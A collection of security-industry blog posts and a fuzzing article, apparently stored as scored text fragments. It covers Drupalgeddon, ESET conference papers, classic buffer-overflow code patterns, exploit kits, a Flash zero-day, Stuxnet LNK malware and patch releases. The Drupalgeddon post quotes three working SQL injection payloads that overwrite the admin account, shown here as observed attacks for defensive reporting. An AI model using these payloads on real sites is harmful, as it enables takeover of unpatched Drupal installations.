"Automated attacks began compromising Drupal 7 websites that were not patched or updated to Drupal 7.32 within hours of the announcement of SA-CORE-2014-005 – Drupal core – SQL injection. You should proceed under the assumption that every Drupal 7 website was compromised unless updated or patched before Oct 15th, 11pm UTC, that is 7 hours after the announcement.
If you like going back in time, I recommend reading these three articles to understand the severity of what happened:",0.011811585314245643
"Oct 15, 2014: Highly Critical SQL Injection Vulnerability Patched in Drupal Core
Oct 17, 2014: Drupal SQL Injection Attempts in the Wild
Oct 29, 2014: Drupal Warns – Every Drupal 7 Website was Compromised Unless Patched",0.01451246695745212
"The Drupalgeddon event came to the forefront of media attention April 2016 with the Panama Papers debacle. When researchers disclosed that Mossack Fonseca had been using Drupal as the platform of choice for their customer portal, and WordPress for their website. There was a lot of speculation into the role that these platforms could have potentially played in the compromise. Drupal was specifically running on Drupal version 7.23 with 25 different vulnerabilities according to Forbes – the most critical being the Drupalgeddon SLQi vulnerability.
This came full circle at the recent DrupalCon 2016 in New Orleans, where we gave a talk on website security, with an emphasis on Drupal. Tony Perez was asked: (a) what his thoughts were on Drupal being the attack vector and (b) if we were still seeing attacks against the vulnerability.
Drupalgeddon… 19 Months Later
It has been a long time since the vulnerability was released – an eternity on internet time – enough so that we almost forgot about it. The web however does not forget!
We decided to investigate and the results were interesting. Remember, the vulnerability was disclosed October 15, 2014 and internet-wide attacks started just a few days after.",0.012284545454055551
"After the initial attacks in October and November of 2014, the attacks dropped and remained consistent through 2016. If someone had not patched, they are surely compromised now. But that doesn’t stop attackers from trying to find new entry points and even compromise already compromised sites.
As for the attack types, they remained consistent to what we saw during the initial release. Most attacks leverage the SQL injection vulnerability to create a new admin user with injections like the following:
Example 1:
name[0%20;update+users+set+name%3d%27derevos%27,+pass%3d%27$S$CTo9G7Lx2mQZv/dfetGZcq7
e1cVNpFpTRdZ8EckF/d6BnrMPZ/Ce%27+where+uid%3d%271%27;;#%20%20]=bob&name[0]=test&pass=shit2&test2=test
Example 2:
name[0;update users set name %3D 'HolaKo' , pass %3D '%24S%24DrV4X74wt6bT3BhJa4X0.XO5bHXl%2FQBnFkdDkYSHj3cE1Z5clGwu' where uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test
Example 3:
POSTLOG:name[0;update users set name %3D 'Mr.R00t2_404' , pass %3D '%24S%24DrV4X74wt6bT3BhJa4X0.XO5bHXl%2FQBnFkdDkYSHj3cE1Z5clGwu',status %3D'1' where
uid %3D '1';#]=test3&name[]=Crap&pass=test&test2=test
Each attack forces a new admin with names Derevos, Holako and Mr.R00t2_404, respectively. After an attempted injection, the attacker logs into the site as the newly created user. What they do, if successful, is a mystery. Each attack we recorded above was mitigated by the Sucuri Firewall. We are however noticing an interesting trend with Drupal 7 sites that we’re providing remediation services to. Attackers are using them to inject SEO spam which also corresponds to the increase in Search Engine Poisoning (SEP) attacks we have been seeing in our Hacked Website Trend Report Q1/2016.
Taking Security Seriously
If you are responsible for a website, Drupal or not, you have to take security seriously. It is your responsibility to patch, monitor, and follow good security practices. If your Drupal site has been hacked, you can follow our free guide to fixing hacked Drupal sites.
",0.01565500247341889
"Virus Bulletin and AVAR: a conference paper is for life
ESET conference papers from the 2014 Virus Bulletin and AVAR conferences are now available.",0.01775095296908613
24 Nov 2014 - 11:38AM,0.010813931093316187
ESET conference papers from the 2014 Virus Bulletin and AVAR conferences are now available.,0.02018284540869031
"As 2014 draws to a close, so does the security conference season, for the moment. However, a conference paper is for life, not just Christmas. (Well, I try to keep all mine available, even though some of the earlier ones are mostly only of historical interest.)",0.020021355578160316
"Since the Virus Bulletin conference in September, Martijn Grooten has published a series of blogs about papers from the conference that have been made available on the VB site, including a paper by Jean-Ian Boutin in which he discusses the commoditization of web injects, and a paper by Eugene Rodionov, Aleksandr Matrosov and myself on the continuing evolution of bootkits.",0.016285176614580954
"VB2014 paper: The evolution of webinjects
VB2014 paper: Bootkits: past, present & future",0.010726006333219407
"The blogs include links to the papers in HTML and PDF formats, and the slide decks, all of which are available on the Virus Bulletin web site, and the videos on VB’s YouTube channel, which show the slides as background to the audio from the actual presentation.",0.015386739690530615
"A quick link for the Bootkit paper is here (PDF), and for the Bootkit presentation here. The webinjects paper is here (PDF), and the corresponding presentation here. Much more information is given in the Virus Bulletin blog articles. The blog series also includes similar articles linking to other papers and presentations from VB2004.",0.013206546914377393
"Meanwhile, I’ve recently returned from the AVAR conference in Sydney. So recently, in fact, that while my body is in the UK, my head still seems to be in a time zone East of Java. But I do remember that Sebastian Bortnik did a great job of presenting our paper Lemming Aid and Kool Aid: Helping the Community to help itself through Education. That paper is now available here.  There’ll be a blog or two expanding on the topic shortly.",0.01565188247393634
"I don’t know if there are any such plans for Peter Kosinar’s presentation on Stealing the internet, one router at a time or Sébastien Duquette’s talk about Exploitation of CVE-2014-1761 in targeted attack campaigns, but both were well received.",0.015234828814376766
"However, the presentation voted top of the AVAR pops was Graham Cluley’s keynote, possibly because of his indescribable rendition of his AntiVirus Industry Song. Hard though that is to credit. But he did promise never to sing it again. (We can but hope.)",0.018273156314627337
"The same may not be true of the motley crew of slightly more musical security researchers who couldn’t resist getting up to play at the party after the conference: after all, it’s become almost traditional to have such an event at the end of meetings in which ESET has had a hand. Here’s a sample courtesy of YouTube and Andreas Marx…",0.01399402251360482
"And the boomerang? A gift from the conference organizers to presenters. Fortunately, I rather like it: I hear it can be really frustrating trying to throw one away.",0.02045509199117912
"David (Boom! Boom!) Harley
Small Blue-Green World
ESET Senior Research Fellow
",0.012155676557933148
"Some examples of vulnerable code and how to find them
""When looking for vulnerabilities in open-source code, it is advisable to check portions of code that is prone to errors"": Useful tips from one of ESET's malware analysts, Matías Porolli, on how to spot vulnerable code.",0.014701238334987154
Matías Porolli,0.009353230931906431
30 Jan 2017 - 02:00PM,0.011896948017106501
"“When looking for vulnerabilities in open-source code, it is advisable to check portions of code that is prone to errors”: Useful tips from one of ESET’s malware analysts, Matías Porolli, on how to spot vulnerable code.",0.01316288365267082
"I have previously recommended a course entitled Software Exploits by Open Security Training, and similarly, a book “called The Shellcoder’s Handbook: Discovering and Exploiting Security Holes”. Using some of the examples presented in the book, I thought it would be a good idea to explore how the theory on real code vulnerabilities stands true.",0.01299408481048292
Copying data,0.009311896427020128
"One of the simplest scenarios in which vulnerable code can manifest itself – which can usually be spotted immediately – goes hand in hand with the copying of buffer data using functions such as strcpy, without performing any check on the size of the copy.",0.01315438307724992
"The above shows part of the vulnerable code on the University of Washington’s IMAP server, which was corrected in 1998. We can see that it never checks the size of the data in mechanism before copying to tmp, which could result in a buffer overflow. The error is easily resolved by a check using strlen (mechanism) before copying, or by using n bytes copy functions, like strncpy.",0.01123101674971072
"As you can imagine, it’s very unusual these days for such vulnerabilities to be found in open-source applications; and, where they do exist, they are quickly corrected.",0.011435545706244166
Wrong indexes in loops,0.007108337958377398
"When the indexes or cut conditions in iterative loops are badly programmed, it can result in more bytes being copied than was intended: either one byte (off-by-one) or several (off-by-a-few). Take, for example, this old version of the OpenBSD FTP demon:",0.01195232771665089
"While the purpose of the code is to reserve one byte for the null character at the end of the string, when the size of name is equal to or greater than npath, and the last byte to be copied is “ (double quotation mark), we can see that the index i increases by more in the highlighted command. This results in the null character being inserted one byte beyond the limit, generating an overflow.",0.011956878785874703
"Loops that parse strings or handle user inputs tend to be good places to look for vulnerabilities, as shown in the below example, again taken from the University of Washington’s IMAP server (CVE-2005-2933):",0.00822393235285368
"In line 20, there is a search for a double quotation mark within the string being parsed. If it is found, the loop in line 22 will copy until a second double quotation mark is found. Clearly, if a string is entered that only has one such character, the loop will keep copying, resulting in a stack overflow.",0.015833319365838094
Integer overflow,0.007559981937857563
"One thing that can often happen when attempting to avoid an excessive amount of data copying to a buffer – by checking the size to be copied – is that the number of bytes to be copied exceeds the largest number that can be represented by the data type, rotating toward small values. The check ends up being completed only because the size is interpreted as a small number, but the copy is actually made up of a large number of elements. This results in an overflow of the destination buffer.",0.012422031076307016
"An example of this is when a multiplication is used that produces very large results, like in this OpenSSH code, which appears in versions prior to 3.4:",0.00936364538608736
"We can see that nresp stores the size of a packet entered by the user. In the highlighted command, nresp is multiplied by the size of a cursor (4 bytes). Consequently, if nresp stores a value greater than 1073741823, the multiplication will exceed the maximum value of unsigned int (4294967295). In other words, malloc will reserve a small quantity of memory and the loop will copy a large quantity of data, producing an overflow. This type of vulnerability is still relevant and common nowadays.",0.014058721512697936
"These are just a few types of vulnerabilities, and I would recommend looking at the book I mentioned earlier for more examples. While some, like the strcpy type, are now very uncommon in today’s open-source applications, their presence lives on in closed or proprietary applications, or those that have never undergone a code audit.",0.009389776697526164
"As a general rule, when looking for vulnerabilities in open-source code, it is advisable to check portions of code that are rarely executed, with special functionalities, as they are more prone to errors. Furthermore, as already mentioned, when developers apply their own functions for parsing or handling strings, data frames, and so on, it increases the chance that they will make errors.",0.01204866632375945
"Image credits: ©txmx 2/Flickr
",0.008542040776372994
"Fuzzing everything in 2014 for 0-day vulnerability disclosure
2014-06-02",0.00763844111742229
"Alisa Esage
Esage Lab
,
Russia
Editor:
Martijn",0.010038486676395952
"Grooten
Abstract
As indicated by the considerable payouts we see being made for valid security vulnerabilities, finding valuable 0-days is not an easy task. Fuzzing – the most common approach to bug hunting – is technologically and scientifically well developed and well documented, yet simply running some fuzzers isn't enough to achieve the desired outcome. Alisa Esage attempts to pin down the secret ingredient for successful bug hunting.
Copyright © 2014 Virus Bulletin",0.014173696397881574
"While the focus of fashionable security research is constantly shifting towards new targets, such as hardware and cloud security, 0-day vulnerability research has never lost its value. In fact, its value has continually risen, as demonstrated by the increase in the number of bug bounty and exploitation contest programs in existence, and their ever-increasing payouts. This year, a total of $850,000 was awarded to Pwn2Own contestants for successful exploitation of 0-day vulnerabilities in popular software [1]. Another bug monetization entity, the Zero Day Initiative, has for many years paid researchers for the responsible disclosure of valid security vulnerabilities (no exploit required), paying around a few thousand USD each time (this has been confirmed by the author).
As these considerable payouts suggest, finding valuable 0-days (that is, exploitable security vulnerabilities in popular software) is not an easy task. Even though fuzzing – which is the most common approach to bug hunting – is technologically and scientifically well developed and well documented, simply running some fuzzers (which is indeed easy to do) is not going to achieve the desired outcome. There seems to be a secret ingredient to finding valuable bugs – one that is missing from the books and publications on the subject. The main objective of the research behind this article was to find that secret ingredient, and to generalize it so that it could be applied to completely arbitrary targets (i.e. everything).
The main measure of research success was assumed to be the ratio of exploitable (as reported by automated tools) vulnerabilities to total number of bugs found in popular software. The secondary measure of success was the total number of bugs found with limited resources, as an indication of a potent fuzzing vector with popular software. By means of these two criteria and some of my own research, I have drawn some conclusions as to what makes a good fuzzing technique.",0.016405980696323152
"The ideal fuzzer
Regardless of the secret ingredient for fuzzing success, the first thing one needs is a good fuzzing framework.
There are a considerable number of fuzzing tools readily available on the Internet, both free and commercial. However, none of them satisfied the objectives of this research due to the following limitations:
They were too specialized. For example, they would only fuzz browsers, or only files. They were not suitable for fuzzing everything by design.
They enforced unnecessary constraints. For example, glue mutation with data feeding and automation with crash analysis. This kills flexibility and scalability, and thus, is not suitable for fuzzing everything.
There was a steep learning curve. All fuzzing frameworks had their own template format and specific configuration. We have to ask whether it is worth the investment of learning a system that is largely constrained anyway.
An ideal fuzzer – one that is suitable for finding security vulnerabilities in arbitrary software – should possess the following properties:
Omnivorous: It should be target invariant – i.e. independent of software type, data type, platform and architecture.
Omnipresent: It should be hosting-platform invariant – i.e. it should be equally capable of working on VM/hardware/localnet/clouds.
Autonomous: It should be able to be left to run on its own. It should rotate mutations/seeds automatically.
‘LEGO’-style modular architecture: One should be able to mix and match components, enabling rapid support for new targets and hot patching for tweaking.
Unlimited, native scaling: It should be possible to have any number of fuzzers running at the same time. It should take very little time to set up new targets.
Immediately actionable output: It should perform auto-analysis of crashes, sort unique cases and send an email with the stats.
Available now: It should be available right now – we don’t have the time for development, and the system must be usable from day one.
To satisfy these requirements, the system’s specific functions must be well segregated and ultimately generalized (abstract). We assume the following system design decisions:
A network client-server architecture
Built upon isolated, generic tools
Native automation (bash, cmd/PowerShell, cscript/wscript, AppleScript etc.)
Native instrumentation (DebugAPI, CrashWrangler, cdb postmortem scripts etc.)
Generic mutators (home-made bit-flipping tools, grep/sed/urandom, Radamsa).
Figure 1. An ideal fuzzing framework architecture.
As shown in Figure 1, the system’s functions are segregated as follows:
Server
Generates and serves test cases
Accepts and sorts crash analysis logs
Provides scripts for additional pre-analysis, sorting, particular trigger location
Client:
Executes the target software in a loop
Monitors exceptions
Analyses crash dumps
Whole system:
Runs in a loop
Scales natively by addition of new clients
Runs on any platform thanks to native automation tools.
As was noted in the introduction to this article, a decent fuzzing framework is necessary in order to start producing crashes, but it is not enough to find those elusive exploitable security vulnerabilities. So, where’s the magic?",0.016828888330698732
"The magic
It has been seven years since the publication of the canonical book Fuzzing: Brute Force Vulnerability Discovery [2], and 10 years since the publication of the first edition of The Shellcoder’s Handbook [3]. Since then, dozens of research papers have been published, hundreds of fuzzing tools have been developed and shared with the community, and thousands of vulnerabilities have been discovered. In 2014, fuzzing is a mature industry, driven not by art or technology, but by the market and competition.
A common mistake made by beginners in this industry is to assume that success in fuzzing is defined by the fuzzer’s speed and size. This is not exactly true, as proven by the success of a few independent researchers against Google’s own ClusterFuzz [4]. To put it simply, one needs millions of test cases if the majority of those test cases are bad (i.e. rejected by the target’s data validation routines, or unable to reach or trigger any vulnerable code). Thinking along this logic, one might conclude that the main thing that matters in fuzzing is to target bug-rich branches of code.
The problem here is that there is no simple algorithmic solution for discovering such bug-rich branches of code on a major scale or for complex data formats. Code coverage allows for the measuring of the volume of code paths that have already been reached, but it doesn’t help in discovering new code segments. Evolutionary input generation only allows new code paths to be discovered on a tiny assembly-level scale, not on the scale of a complex data format. Think of an RTF document with an embedded Word document with embedded ActiveX – how long would it take to evolve such a complex sample from a generic seed? Probably forever. However, my experience shows that it’s exactly this kind of complex sample that targets the most ‘fresh’ code in applications.
Thus, discovering potent fuzzing vectors remains largely the responsibility of human intelligence.
Let’s think: where can it possibly be, this bug-rich code base?",0.01668956657328924
"The 'Elusive Joes'
Clearly, unknown or unpopular software is rich with an unaudited code base, because no one cares about it. And nor do we. As per popular software which everyone cares about, the density of ‘previously unknown’ bugs in various segments of code is primarily defined by the competition’s assumptions and research patterns.",0.010796111089127258
"Non-obvious
Part of the code base in a known, popular piece of software may still be bug-rich – for example, the code may not be obvious to reach or easy to trigger.
One example is the TIFF 0-day discovered in the wild in 2013 (CVE-2013-3906). The vulnerability lies within the Microsoft Office ogl.dll graphics processing module, which is specific to Office 2007. In every other Office version, embedded images are processed by the Windows native module gdiplus.dll. This means that this vulnerability could only be found by fuzzing Office 2007 specifically with documents containing embedded malformed images – not a common vector with fuzzing graphics or documents.
Another example is CVE-2014-0315, the Insecure Library Loading vulnerability in Windows’ handling of .cmd and .bat files. Vulnerabilities of this type are quite easy to find and are generally considered all to have been fixed long ago, but they are still being found in 2014.
The third example is CVE-2013-1324, the Microsoft Office .wpd file vulnerability. This is a stack-based buffer overflow – the trivial type of bug which was considered to have been eliminated long ago, but has still been found in the latest versions of Microsoft Office.
To summarize, some places to look for non-obvious code bases are:
Ancient, rarely used code bases
Hidden functionalities
Software-specific source code for a system’s native functionality.",0.013017782751495344
"Effortful
A code base may long remain bug-rich if reaching it requires considerable effort.
One example is the use-after-free vulnerability in Microsoft’s RDP ActiveX (CVE-2013-1296). ActiveX modules are an easy target and should, in theory, be well audited already. The possible reason why this ActiveX remained vulnerable in 2013 is that public tools for fuzzing ActiveX don’t support vulnerabilities of the use-after-free type.
Another example is the Microsoft DKOM/RPC service, which exposes ports 135 and 445 on a typical Windows system. This is a huge, complex and completely undocumented code base that has yet to be targeted by researchers.
So, some more signs of under-audited code bases worthy of our attention are:
Those for which public fuzzing tools have limitations (easily augmented)
Those with undocumented data formats (easily addressed by generic tools).",0.009341454992732201
"Constrained
A code base may be under-audited because it was previously assumed to be too constrained to be valuable for exploitation, e.g. due to extra security controls or user interaction.
One example is, again, the system-standard ActiveX in Windows. Modern versions of Internet Explorer require user interaction to enable an ActiveX, so this is not considered to be an interesting vector for research. The misconception here is that IE is not the only software capable of loading and controlling an ActiveX (think Microsoft Word).",0.01039929617592239
"Summary
In summary, what I have concluded to be the minimum requirements for successful fuzzing are the following:
Research! The primary target should be code bases, not data formats or data input interfaces or fuzzing automation technology. Look for ancient code, hidden/non-obvious functionality, etc.
Bet on complex data formats. For complex data, code paths exist which are not reachable automatically – which means their code bases have probably never been audited and there will be no competition.
Craft complex fuzzing seeds manually. The rule of ‘minimal size sample’, as stated in [2], is obsolete in 2014.
Remove one to two data format layers before injecting malformed data. Deep parsers are less well audited (because researchers are lazy?) and they tend to contain more bugs (because programmers are lazy?).
Estimate the potency of a new vector by dumb fuzzing prior to investing in smart fuzzing. Use the assumption that bugs tend to crowd in the direction of a ‘less well audited’ code base.
Tweak a lot to get a ‘feeling’ for the particular target.
Keep the fuzzing setting dirty. Fuzzing is dirty by design. Incorporating it nicely into a well-designed system kills the flexibility that is necessary for tweaking and rapid prototyping.
Do more research.",0.011984590588505095
"Bibliography
[1] Pwn2Own 2014: A Recap. http://www.pwn2own.com/2014/03/pwn2own-2014-recap/.
[2] Sutton, M.; Greene, A.; Amini, P. Fuzzing: Brute Force Vulnerability Discovery. http://www.fuzzing.org/.
[3] Koziol, J.; Litchfield, D.; Aitel, D.; Anley, C.; Eren, S.; Mehta, N.; Hassell, R. The Shellcoder’s Handbook: Discovering and Exploiting Security Holes. First Edition. 2004.
[4] Google Chromium Security Hall of Fame. http://www.chromium.org/Home/chromium-security/hall-of-fame/.
",0.017475633738699425
"Hacking Team Leak Exposes New Flash Player Zero Day
Update (07/07 11:55 AM PT): Adobe released a security bulletin about this vulnerability which is assigned CVE-2015-5119. A fix is scheduled for July 8.",0.014388335914018668
"– – – –
The security community was ablaze yesterday with the news of a massive data dump and hack of most controversial firm Hacking Team.
Hacking Team specializes in surveillance software which it resells to various governments around the world, and in particular to some oppressive regimes, a major issue that has activists outraged.
The data stolen from the firm contains several gigabytes worth of exploits, malware and other very sensitive information.
Among them, a new Flash Player zero day (CVE-2015-5119) affecting Flash Player up to version 18.0.0.194 was found and is making headlines.",0.015677923561222884
We analyzed a copy of the exploit and can confirm that Malwarebytes Anti-Exploit users were already protected against this threat:,0.00767204728819082
"Without a doubt cyber criminals have already got their hands on it and will integrate it in their exploit kits soon.
Software vendor Adobe is said to be working on an emergency patch. In the meantime, you should be extremely cautious and either disable the plugin or make sure you are running anti-exploit mitigation software to protect yourself.
We will update this blog post with additional information as it comes through.
",0.015049950823501246
"Exploit kits: summer 2018 review
The uptick trend in cybercriminals using exploit kits that we first noticed in our spring 2018 report has continued into the summer. Indeed, not only have new kits been found, but older ones are still showing signs of life. This has made the summer quarter one of the busiest we’ve seen for exploits in a while.
Perhaps one caveat is that, apart from the RIG and GrandSoft exploit kits, we observe the majority of EK activity contained in Asia, maybe due to a greater likelihood of encountering vulnerable systems in that region. Malware distributors have complained that “loads” for the North American or European markets are too low via exploit kit, but other areas are still worthy targets.
In addition, we have witnessed many smaller and unsophisticated attackers using one or two exploits bluntly embedded in compromised websites. In this era of widely-shared exploit proof-of-concepts (PoCs), we are starting to see an increase in what we call “pseudo-exploit kits.” These are drive-by downloads that lack proper infrastructure and are typically the work of a lone author.
In this post, we will review the following exploit kits:",0.012766456715185726
"RIG EK
GrandSoft EK
Magnitude EK
GreenFlash Sundown EK
KaiXin EK
Underminer EK
Pseudo-EKs",0.015123337180359742
"CVEs
Two newly found vulnerabilities in 2018, Internet Explorer’s CVE-2018-8174 and Flash’s CVE-2018-4878, have been widely adopted and represent the only real attack surface at play. Nevertheless, some kits are still using older exploits in technologies that are being retired, and most likely with little efficacy.",0.009509902645412849
"RIG EK
RIG EK remains quite active in malvertising campaigns and compromised websites, and is one of the few exploit kits with a wider geographic presence. It is pictured below in what we call the HookAds campaign, delivering the AZORult stealer.",0.012483183075182813
"GrandSoft EK
GrandSoft is probably the second most active exploit kit with a backend infrastructure that is fairly static in comparison to RIG. Interestingly, both EKs can sometimes be seen sharing the same distribution campaigns, as pictured below:",0.016534862939585504
"Magnitude EK
Magnitude, the South Korean–focused EK, keeps delivering its own strain of ransomware (Magniber). We documented changes in Magniber in recent weeks with some code improvements, as well as a wider casting net among several Asian countries.",0.01494846063283839
"GreenFlash Sundown EK
A sophisticated but more elusive EK focusing on Flash’s CVE-2018-4878, GreenFlash Sundown is still active in parts of Asia thanks to a network of compromised OpenX ad servers. We haven’t seen any major changes since the last time we profiled it, and it is still distributing the Hermes ransomware.",0.01451295970999944
"KaiXin EK
KaiXin EK (also known as CK VIP) is an older exploit kit of Chinese origin, which has maintained its activity over the years. It is unique for the fact that it uses a combination of old (Java) and new vulnerabilities. When we captured it, we noted that it pushed the Gh0st RAT (Remote Access Trojan).",0.01186160696435934
"Underminer EK
Although this exploit kit was only identified and named recently, it has been around since at least November 2017 (perhaps with only limited distribution to the Chinese market). It is an interesting EK from a technical perspective with, for example, the use of encryption to package its exploit and prevent offline replays using traffic captures.
Another out-of-the-ordinary aspect of Underminer is its payload, which isn’t a packaged binary like others, but rather a set of libraries that install a bootkit on the compromised system. By altering the device’s Master Boot Record, this threat can launch a cryptominer every time the machine reboots.",0.011956694169808602
"Pseudo-EKs
Many exploit packs have leaked and been poached over the years, notwithstanding the availability of a large number of other dumps (i.e. HackingTeam) or proofs-of-concept. As a result, it is not surprising to see many less-skilled actors putting together their own “pseudo-exploit kits.” They are a far cry from being an EK—they are usually static in nature, their copy/paste exploits are buggy, and consequently, they are only used by the same threat actor in limited distribution. The pseudo-exploit we picture below (offensive domain name has been blurred) is one of the better ones we saw in July, in particular for its use of CVE-2018-8174.",0.01176650664568235
"Mitigation
We are continuously checking drive-by download attacks against our software. This time around, we had a more extensive test bed thanks to new and old exploit kits making it into this summer edition. Malwarebytes continues to block exploit kits with different layers of technology to protect our customers.",0.018281930759556198
"Don’t call it a comeback
It seems as though talking about the demise of exploit kits triggered an opposite reaction. Certainly, some digging is required to encounter the more obscure or geo-focused toolkits, but this revival of sorts continues thanks to Internet Explorer’s—and to a lesser extent Flash’s—newly found vulnerabilities.
While IE has a small and decreasing global market share (7 percent), it still has an important presence in countries like South Korea (31 percent) or Japan (18 percent), which could explain why there is still notable activity in a few select regions.
Exploit kits, even in a reduced and less impactful form, are likely to stick around for a while, at least for as long as people use a browser that wants to latch on indefinitely.
",0.011525110065409572
UTM Up2Date 9.113 Released,0.008563187094663638
"Written by
Eric Bégoc",0.010229904213713614
"June 16, 2014",0.008223295957008991
Network up2date UTM UTM 9,0.01007005226623292
"We are pleased to announce that a new Up2Date package is available for Sophos UTM.
This update introduces the bugfix for the OpenSSL SSL/TLS vulnerability (CVE-2014-0224)
Please read on to see the full details of this release.",0.012299643878132205
"Sophos UTM 9.113
News",0.009889550272559555
Security Update,0.007849980180340443
Remarks,0.009780636038266843
"System will be rebooted
Connected RED devices will perform firmware upgrade
Windows SSL VPN Client should be updated",0.007889393400226208
Bugfixes,0.009816324567177737
31939 OpenSSL SSL/TLS MITM vulnerability (CVE-2014-0224) [9.1],0.010888561515866813
"Download:
While you do not need to manually download Up2Date packages (they will automatically download and prepare themselves for you to install), for manual application of Up2Dates or for UTM installations without Internet connections, you can retrieve them using the link below.",0.011992808570035818
"Up2date link:
ftp://ftp.astaro.de/UTM/v9/up2date/u2d-sys-9.112012-113001.tgz.gpg",0.010083484581400626
"Up2date MD5sum:
ca92863b248868df05405b0ec065660c",0.009624017585641464
"File size:
≈12MB",0.007895630990491731
"Up2Date Installation:
Sophos Up2Date technology makes it easy to upgrade your Sophos UTM to the latest version.
There are two ways to apply an already-downloaded Up2Date package to the system:",0.013772033919475235
"Log on to WebAdmin, navigate to Management >> Up2Date >> Overview and use Update to latest version now to install the Firmware Up2Date. Click on the “Watch Up2Date Progress in new window” and an extra browser window will show the progress of the Up2Date installation. (The System administrator will receive a notification email once the Up2Date process has finished.)
Download the Up2Date package from our HTTP or FTP Server and install it under Management >> Up2Date >> Advanced:",0.011976908437992817
Sophos UTM Up2Date FTP Mirrors:,0.007242273332700666
Feedback,0.009067519666800083
"If you want to provide feedback or want to discuss any of the UTM V9 features you should post it on our User Bulletin Board. Please indicate the version you are using to help us (and everyone helping you).
If you have any feedback on our help, manual, or any documentation (Online Help) please send it to nsg-documentations@sophos.com.
You are free to use our new demo server environment without hassle, nags, or registration. Enjoy!",0.015233574152306972
"Eric Bégoc
Senior Product Manager",0.010102162674290538
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
"Share on LinkedIn
",0.009855679767380665
"New malicious LNKs: here we go…
These new families represent a major transition: Win32/Stuxnet demonstrates a number of novel and interesting features apart from the original 0-day LNK vulnerability, such as its association with the targeting of Siemens control software on SCADA sites and the use of stolen digital certificates, However, the new malware we're seeing is far less sophisticated, and suggests bottom feeders seizing on techniques developed by others. Peter Kosinar comments:",0.012604017378950338
22 Jul 2010 - 11:19AM,0.011300701639786581
"These new families represent a major transition: Win32/Stuxnet demonstrates a number of novel and interesting features apart from the original 0-day LNK vulnerability, such as its association with the targeting of Siemens control software on SCADA sites and the use of stolen digital certificates, However, the new malware we’re seeing is far less sophisticated, and suggests bottom feeders seizing on techniques developed by others. Peter Kosinar comments:",0.011899571099435513
"Having implemented generic detection of the CVE-2010-2568 vulnerability used to propagate the now infamous Win32/Stuxnet, ESET has identified not one but two new malware families that exploit the same vulnerability.  This vulnerability allows code execution through malicious LNK (shortcut) files.",0.014528357012446924
"We have identified a new family that exploits this unpatched vulnerability in order to spread, which we have labelled Win32/TrojanDownloader.Chymine.A.  At the time of analysis, this threat downloads and install a key stroke logger which we detect as Win32/Spy.Agent.NSO trojan.  The server used to deliver the components used in this attack is presently located in the US, but the IP is assigned to a customer in China.",0.009254932883815736
"Minutes after identifying this new attack, we observed a known threat, Win32/Autorun.VB.RP, which has been updated to include the CVE-2010-2568 exploit as a new propagation vector.  Win32/Autorun.VB.RP seems to download and install additional components on infected machines.",0.011403414174903537
"This new development follows a typical path of evolution in malware.  Often there are only days between the initial release of information regarding a critical vulnerability, and the discovery of its exploitation being executed in the wild by malware authors.  It is safe to assume that more malware operators will start using this exploit code in order to infect host systems and increase their revenues.",0.009724599863963235
"These new families represent a major transition: Win32/Stuxnet demonstrates a number of novel and interesting features apart from the original 0-day LNK vulnerability, such as its association with the targeting of Siemens control software on SCADA sites and the use of stolen digital certificates, However, the new malware we're seeing is far less sophisticated, and suggests bottom feeders seizing on techniques developed by others. Peter Kosinar comments:",0.012250028484603992
"It should be noted that we have NOT observed Win32/TrojanDownloader.Chymine.A or any of the related stuff generating any malicious LNK; we've only seen LNKs exploiting the latest vulnerability, which pointed to it. In other words, Win32/TrojanDownloader.Chymine.A doesn't spread by itself, there must be something (or someone) else ""helping"" it.",0.010661861818522134
"In contrast to that, Win32/Autorun.VB.RP (which looks very much like like an updated version of the malware described at http://isc.sans.edu/diary.html?storyid=9229), DOES actually produce new LNK files exploiting the CVE-2010-2568 vulnerability to facilitate its own spreading.",0.010292975761830414
Special thanks to Richard Baranyi and Peter Kosinar for their contribution to this research.,0.01438018587801082
"Pierre-Marc Bureau, Senior Researcher
David Harley, Senior Research Fellow
",0.010772653260498477
Microsoft’s September patches fix a raft of serious bugs,0.007384782047886951
Updates for Windows and Mac users resolve more than five dozen software vulnerabilities,0.009217892403086902
"Written by
Andrew Brandt",0.009442099916216584
"September 19, 2018",0.009090421679393335
SophosLabs Uncut 2018-09 CVE Exploits FragmentSmack Microsoft October 2018 Office Patch Tuesday Vulnerabilities Windows,0.007560809794386558
"By Andrew Brandt
Microsoft last week addressed 62 different vulnerabilities in its monthly round of updates for Windows, Office, and other software, 17 of which the company classified as critical. Affected products span Microsoft’s software catalogue, including Office applications for Mac and Windows, developer tools, the .net platform, four major browser releases (Internet Explorer 9 through 11 and Edge), and Desktop and Server operating systems.
Among these updates deemed most critical, Microsoft reports that at least four of the vulnerabilities were publicly disclosed prior to the update’s release (the critical classified CVE-2018-8457 and CVE-2018-8475, the actively exploited CVE-2018-8440, and the annoying-but-disruptive CVE-2018-8409), which makes the exploitation of those vulnerabilities much more likely (or already happening).
In addition, some of the vulnerabilities only require a victim to do something as simple as download an image, or open a specially crafted Office document file, in order for the attacker to successfully run arbitrary commands on the victim’s machine. While these vulnerabilities may not have been disclosed prior to the update’s release (and, in fact, several of the discoveries came from internal teams within Microsoft), it’s a safe bet that exploit developers are furiously working towards building them now, so they won’t remain a hypothetical risk for long.
Internet Explorer and Edge
If you’re using any version of Windows that currently receives updates (Windows 7 or later), then you probably have a browser on your PC affected by these patches. It’s not really much of a surprise that older browsers may need some updates, but this month’s patches also target Edge, Microsoft’s totally-redesigned browser that supplants IE, but may also be installed along with IE on some systems.
Some of the Edge-specific vulnerabilities originate in the scripting system (called Chakra) that Microsoft created specifically to address scripting vulnerabilities in IE. The available patches not only update Edge, but also will update Chakra development tools, if you have them installed.
Other weaknesses include memory corruption bugs in Internet Explorer, in some cases affecting versions going back to IE 9 for the decade-old Windows Server 2008. While this seems like a bit of an edge-case, there are still lots of machines running these older operating systems in a wide variety of business environments, including (as observed last week by a labs employee) on the computers for employee use on the showroom floor of at least one well known retailer in the US.
Bugs like this memory corruption vulnerability only require the user to accidentally click a link to a malicious website, or even just browse a site that could serve malvertising. While Microsoft says that (to its knowledge) these vulnerabilities haven’t been exploited yet, it’s probably only a matter of time.
Microsoft Office and the fonts
The most serious of the bugs affecting Office users is CVE-2018-8332, otherwise known as the Win32k Graphics Remote Code Execution Vulnerability, wherein a library common to all supported versions of Windows (and that’s also present in Office 2016 for Mac) renders unpatched machines vulnerable to an exploit in which a weaponized Office document contains a specially-crafted embedded font.
